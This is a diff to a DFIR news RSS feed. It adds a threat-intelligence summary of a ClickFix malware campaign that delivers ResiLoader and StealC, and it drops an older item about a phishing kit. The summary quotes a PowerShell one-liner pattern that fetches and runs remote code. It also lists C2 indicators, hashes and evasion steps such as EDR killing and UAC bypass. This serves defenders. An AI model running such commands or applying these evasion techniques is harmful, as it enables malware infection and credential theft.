@@ -5,8 +5,27 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Thu, 02 Jul 2026 16:03:35 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 02 Jul 2026 17:03:29 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Fake Google and Cloudflare verification pages spread multiple malware families</title>
+      <link>https://www.malwarebytes.com/blog/threat-intel/2026/07/fake-google-and-cloudflare-verification-pages-spread-multiple-malware-families</link>
+      <description>ClickFix campaign active since late 2025 delivers seven malware families via fake Google and Cloudflare verification pages, including a newly documented loader called ResiLoader that kills EDR before dropping StealC.
+
+Key findings:
+
+- The infection chain starts when a victim runs a PowerShell one-liner copied from a fake CAPTCHA or verification page, typically following the pattern: powershell -c "iex(irm '{IP}:{Port}/{Path}' -UseBasicParsing)". The script drops a .ps1 to %Temp% as tmp{4char}.tmp.ps1, creates C:\ProgramData\Zooms, pulls next-stage payloads from Cloudflare R2 buckets or direct IPs hosted on ASN Dedik Services Limited, then beacons to http://{IP}/dl-callback.
+
+- ResiLoader (MD5: 72907d0ca3258365838626f6a8d993a6) arrives as msys-crypto-3.dll via DLL hijacking of ssh-add.exe inside a trojanized Franz app (libEGL.zip from pub-7080e0c20a0e47ca95a476869c532367.r2[.]dev). It drops the legitimate OPSWAT pcdhost.sys driver to terminate 140+ EDR/AV processes (BYOD technique), bypasses UAC via ICMLuaUtil, persists via HKLM/HKCU Run key pointing to C:\ProgramData\Google Update\ssh-add.exe, then process-hollows ServiceModelReg.exe to run StealC (MD5: 0234E3188F2883A438B3F2BEAB7A78B2) with C2 at 146.19.248[.]120.
+
+- Additional payloads include Amatera Stealer (C2: xzz.proxygrid[.]cc), Remus, NetSupport RAT, CastleLoader, and a Rust-based stealer (C2: popularcard[.]shop). The Franz loader C2 is completstep[.]com.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2072727872926560605</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2072727872926560605">DFIR Radar</source>
+      <pubDate>Thu, 02 Jul 2026 17:03:29 +0000</pubDate>
+      <guid isPermaLink="false">2072727872926560605</guid>
+    </item>
     <item>
       <title>Inside Elastic InfoSec's agentic SOC: cutting alert triage from 30 minutes to under 3</title>
       <link>https://www.elastic.co/security-labs/alert-triage-agentic-soc-elastic-workflows</link>
@@ -1707,17 +1726,6 @@ Key details:
       <source url="https://x.com/DFIR_Radar/status/2069481215468675494">DFIR Radar</source>
       <pubDate>Tue, 23 Jun 2026 18:02:26 +0000</pubDate>
       <guid isPermaLink="false">2069481215468675494</guid>
-    </item>
-    <item>
-      <title>EvilTokens: How “Ghost” Code Threatens US and European Businesses</title>
-      <link>https://any.run/cybersecurity-blog/eviltokens-ghost-code-analysis/</link>
-      <description>EvilTokens phishing kit abuses Microsoft's device-code OAuth flow to hijack M365 accounts, hiding its landing page behind AES-GCM encryption that only decrypts in the browser DOM. Static URL analysis misses the attack entirely.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2069466051440705946</description>
-      <category>THREAT INTELLIGENCE</category>
-      <source url="https://x.com/DFIR_Radar/status/2069466051440705946">DFIR Radar</source>
-      <pubDate>Tue, 23 Jun 2026 17:02:10 +0000</pubDate>
-      <guid isPermaLink="false">2069466051440705946</guid>
     </item>
   </channel>
 </rss>
